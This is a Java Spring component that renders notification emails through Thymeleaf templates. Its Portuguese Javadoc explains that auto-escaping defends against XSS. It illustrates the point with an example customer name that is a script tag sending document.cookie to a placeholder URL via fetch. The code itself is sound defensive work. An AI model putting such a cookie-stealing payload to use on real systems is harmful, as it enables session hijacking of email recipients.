package com.caiocodes.vigencia.notification.infrastructure.sender;

import com.caiocodes.vigencia.notification.application.port.NotificationRenderer;
import com.caiocodes.vigencia.notification.domain.Notification;
import java.util.Locale;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Component;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;

/**
 * Renderiza o corpo do e-mail com Thymeleaf.
 *
 * <p><b>Por que Thymeleaf e não concatenação de strings:</b> {@code th:text} faz
 * <i>escaping</i> de HTML automaticamente, e é essa a defesa contra XSS por
 * nome de cliente. Um cliente cadastrado como
 * {@code <script>fetch('http://…'+document.cookie)</script>} vira texto inerte
 * no e-mail — com concatenação, viraria script no cliente de e-mail de quem
 * abrisse.
 *
 * <p>Nunca usar {@code th:utext} (o "u" é de <i>unescaped</i>) com dado vindo do
 * usuário. Nos templates deste projeto ele não aparece nenhuma vez.
 */
@Component
@RequiredArgsConstructor
public class ThymeleafNotificationRenderer implements NotificationRenderer {

    private static final String PREFIX = "notification/";

    private final TemplateEngine templateEngine;

    @Override
    public String render(Notification notification) {
        Context contexto = new Context(new Locale.Builder().setLanguage("pt")
                .setRegion("BR").build());
        // O payload congelado no agendamento é a única fonte: recarregar o
        // contrato aqui faria o e-mail mostrar o valor de hoje, e não o do dia
        // em que o aviso foi agendado.
        notification.payload().forEach(contexto::setVariable);
        contexto.setVariable("subject", notification.subject());
        contexto.setVariable("recipient", notification.recipient());

        return templateEngine.process(PREFIX + template(notification), contexto);
    }

    /**
     * Um template por tipo, com nome derivado do enum.
     *
     * <p>Sem {@code switch}: tipo novo é template novo, sem tocar nesta classe.
     * Se o arquivo não existir, o Thymeleaf lança — e o dispatcher trata isso
     * como falha <b>permanente</b>, porque tentar de novo daqui a um minuto
     * procura o mesmo arquivo inexistente.
     */
    private static String template(Notification notification) {
        return notification.type().name().toLowerCase().replace('_', '-');
    }
}
